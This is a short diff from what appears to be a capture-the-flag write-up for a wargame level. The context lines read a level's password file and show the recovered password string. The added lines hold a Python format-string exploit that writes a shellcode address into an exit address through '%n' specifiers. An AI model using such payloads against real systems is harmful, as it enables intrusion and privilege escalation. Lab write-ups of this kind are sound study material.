@@ -212,3 +212,21 @@ pwd 1>&2
 cat /home/users/level06/.pass 1>&2
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
+
+```
+import struct
+
+shell_addr = 0xffffddb4
+
+exit_addr = struct.pack ("I", 0x80497e0)
+exit_addr += struct.pack ("I", 0x80497e0 + 2)
+
+msb = int(0xffff)
+lsb = int(0xddb4)
+
+exit_msb = lsb - 8
+exit_lsb = msb - lsb
+
+print exit_addr  + "%" + str(exit_msb) + "d%10$n" + "%" + str(exit_lsb) + "d%11$n"
+```
+
